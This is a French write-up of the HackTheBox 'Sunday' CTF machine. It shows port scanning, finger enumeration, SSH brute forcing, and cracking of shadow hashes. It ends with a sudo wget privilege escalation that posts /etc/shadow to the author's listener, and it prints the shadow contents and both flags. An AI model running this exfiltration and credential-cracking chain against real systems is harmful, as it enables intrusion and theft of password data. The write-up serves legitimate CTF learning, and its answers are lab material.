# Solution du CTF Sunday de HackTheBox

Thank Got It's Monday
---------------------

Ce qui m'a attiré initialement sur le CTF Sunday de [HackTheBox](https://www.hackthebox.eu/) était le fait qu'il s'agissait de la seule machine sous *Solaris*.  

Finalement il s'est avéré que je n'ai pas vraiment vu de différences avec un système Linux :D  

Wednesday's Child
-----------------

Ce qui a été bien plus perturbant sur ce CTF c'est la façon dont la machine pouvait répondre à nos scans de ports :  

```plain
Nmap scan report for 10.10.10.76
Host is up (0.038s latency).

PORT    STATE SERVICE
79/tcp  open  finger
| finger: Login       Name               TTY         Idle    When    Where\x0D
|_sammy    sammy                 pts/2         21 Tue 09:07  10.10.14.169        \x0D
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
```

Certes, certes...  

Essayons de fragmenter les paquets et de les rendre moins typés :  

```plain
devloop@kali:~$ sudo nmap -T5 -f 10.10.10.76 -p-  --data-length 18
[sudo] Mot de passe de devloop : 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-05 17:52 CEST
Warning: 10.10.10.76 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.76
Host is up (0.040s latency).
Not shown: 34399 filtered ports, 31132 closed ports
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
47970/tcp open  unknown
60423/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 895.68 seconds
```

Allez essaye encore :  

```plain
devloop@kali:~$ sudo masscan -e tun0 --rate 200 -p1-65535 10.10.10.76

Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2018-06-14 08:38:20 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22022/tcp on 10.10.10.76
Discovered open port 111/tcp on 10.10.10.76
Discovered open port 79/tcp on 10.10.10.76
Discovered open port 49333/tcp on 10.10.10.76
```

Le port 22022 s'avère être un SSH (SunSSH). Quand au finger on peut le questionner un peu moins gentiment avec Metasploit :  

```plain
msf auxiliary(scanner/finger/finger_users) > exploit

[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sunny
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: adm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: lp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: uucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nuucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dladm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: listen
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: bin
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: daemon
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: gdm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: noaccess
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody4
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: postgres
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: root
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: svctag
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sys
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: xvm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: openldap
[+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, bin, daemon, dladm, gdm, listen, lp, noaccess, nobody, nobody4, nuucp, openldap, postgres, root, sunny, svctag, sys, uucp, xvm
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Il y a de l'activité sur le compte *sunny* :  

```plain
devloop@kali:~$ finger -l sunny@10.10.10.76
Login name: sunny               In real life: sunny
Directory: /export/home/sunny           Shell: /bin/bash
On since Jun  5 07:35:35 on pts/2 from 10.10.15.73
2 minutes 19 seconds Idle Time
No unread mail
No Plan.

Login name: sunny               In real life: sunny
Directory: /export/home/sunny           Shell: /bin/bash
On since Jun  5 08:15:58 on pts/3 from 10.10.16.7
3 minutes 18 seconds Idle Time

Login name: sunny               In real life: sunny
Directory: /export/home/sunny           Shell: /bin/bash
On since Jun  5 07:52:39 on pts/4 from 10.10.14.169
23 minutes Idle Time
```

Les IPs sont celles d'autres participants. L'emplacement du home de l'utilisateur laisse penser que son dossier est exporté via NFS.  

Faute de mieux on brute-force le compte et on se trouve un peu bête devant le mot de passe trouvé :  

```plain
devloop@kali:~$ hydra -l sunny -P /usr/share/ncrack/top50000.pwd ssh://10.10.10.76:22022
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-14 21:30:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50084 login tries (l:1/p:50084), ~3131 tries per task
[DATA] attacking ssh://10.10.10.76:22022/
[STATUS] 484.00 tries/min, 484 tries in 00:01h, 49600 to do in 01:43h, 16 active
[STATUS] 488.33 tries/min, 1465 tries in 00:03h, 48619 to do in 01:40h, 16 active
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-06-14 21:35:16
```

On obtient alors notre accès sur la machine mais pas encore de flag.  

```plain
sunny@sunday:~$ uname -a
SunOS sunday 5.11 snv_111b i86pc i386 i86pc Solaris

sunny@sunday:~$ w
  9:37am  up  2:20,  6 users,  load average: 0,71, 1,73, 1,30
User     tty           login@  idle   JCPU   PCPU  what
sunny    pts/2         7:18am     1                -bash
sunny    pts/3         7:31am    59      4         -bash
sunny    pts/4         8:23am     3      5      4  vim
sammy    pts/5         9:08am            4         crontab
sunny    pts/7         9:35am                      -bash
sunny    pts/8         9:35am                      w
```

Je trouve quelques fichiers bizarres sur la machine :  

```plain
sunny@sunday:~$ file ./Desktop/core
./Desktop/core: ELF 32-bit LSB core file 80386 Version 1, from 'packagemanager'
sunny@sunday:~$ file ./Downloads/reverse.solaris.x86.1337.elf
./Downloads/reverse.solaris.x86.1337.elf:       ELF 32-bit LSB executable 80386 Version 1, statically linked, stripped
```

Le second est potentiellement le reverse-shell d'un autre participant. Quand au core dump on laisse de côté pour le moment.  

Il y a un programme utilisable via sudo mais qui ne semblait pas exploitable via des failles classiques :  

```plain
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$ bash --version
GNU bash, version 3.2.25(1)-release (i386-pc-solaris2.11)
Copyright (C) 2005 Free Software Foundation, Inc.
```

Encore une bizarrerie :  

```plain
sunny@sunday:/etc$ ls -l /var/adm/spellhist
-rw-rw-rw- 1 root bin 0 2009-05-14 21:18 /var/adm/spellhist
```

Finalement je trouve des hashs dans un dossier backup :  

```plain
sunny@sunday:/backup$ ls -l
total 2
-r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup

sunny@sunday:/$ cat backup/shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Si on cherche des mentions de l'utilisateur *sammy* sur le système on en trouve dans le fichier */var/sadm/system/logs/install\_log* :  

```plain
<OM Apr 15 14:22:31> /sbin/install-finish  -B '/a' -R '$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD' -n 'sammy' -l 'sammy' -p '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB' -G '10' -U '101'
<ICT Apr 15 14:22:32> Starting Python script of Install Completion Tasks
<ICT Apr 15 14:22:32> BASEDIR: /a
<ICT Apr 15 14:22:32> USER_SPEC_DBGLVL:
<ICT Apr 15 14:22:32> ROOT_PW: $5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD
<ICT Apr 15 14:22:32> NU_GOS: sammy
<ICT Apr 15 14:22:32> NU_LOGIN: sammy
<ICT Apr 15 14:22:32> NU_PW: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
<ICT Apr 15 14:22:32> NU_GID: 10
<ICT Apr 15 14:22:32> NU_UID: 101
```

Ça commence à être intéressant :)  

Il est temps de faire chauffer le processeur (faute de mieux) :  

```plain
$ ./hashcat64.bin -m 7400 -a 0 /tmp/hashes.txt /opt/wordlists/rockyou.txt
 hashcat (v4.1.0) starting...

 OpenCL Platform #1: Intel(R) Corporation
 ========================================
 * Device #1: Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz, 3981/15926 MB allocatable, 4MCU

 Hashes: 3 digests; 3 unique digests, 3 unique salts
 Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
 Rules: 1

 Applicable optimizers:
 * Zero-Byte

 Minimum password length supported by kernel: 0
 Maximum password length supported by kernel: 256

 ATTENTION! Pure (unoptimized) OpenCL kernels selected.
 This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
 If you want to switch to optimized OpenCL kernels, append -O to your commandline.

 Watchdog: Hardware monitoring interface not found on your system.
 Watchdog: Temperature abort trigger disabled.

 Dictionary cache hit:
 * Filename..: /opt/wordlists/rockyou.txt
 * Passwords.: 14344389
 * Bytes.....: 139921537
 * Keyspace..: 14344389

 $5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:sunday
 $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
```

Sunday
------

Une fois connecté avec le compte *sammy* on obtient notre flag (*a3d9498027ca5187ba1793943ee8a598*).  

Et on dispose d'une entrée sudo intéressante :  

```plain
sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

La question s'est posée de comment exploiter cette autorisation sans spolier les autres participants et sans modifier de fichiers système (ex: */etc/passwd*) ce qui risquerait là aussi de bloquer les autres participants...  

J'ai cherché du côté du fichier *wgetrc* mais il ne permet pas de faire exécuter des commandes unix :'(  

Finalement l'idée que j'ai retenu est d'utiliser wget pour soumettre en HTTP POST un fichier vers un port qu'on aura auparavant mis en écoute.  

On peut par exemple s'envoyer le fichier shadow ainsi :  

```bash
sudo /usr/bin/wget --post-file /etc/shadow http://10.10.15.90:8080/
```

Et c'est dans la poche :  

```plain
devloop@kali:/tmp$ ncat -l -p 8080 -v
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 10.10.10.76.
Ncat: Connection from 10.10.10.76:61174.
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.15.90:8080
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 634

root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
uucp:NP:6445::::::
nuucp:NP:6445::::::
dladm:*LK*:::::::
smmsp:NP:6445::::::
listen:*LK*:::::::
gdm:*LK*:::::::
zfssnap:NP:::::::
xvm:*LK*:6445::::::
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

De la même façon on peut exfiltrer le flag root (*fb40fab61d99d37536daeec0d97af9b8*)

*Published September 29 2018 at 20:09*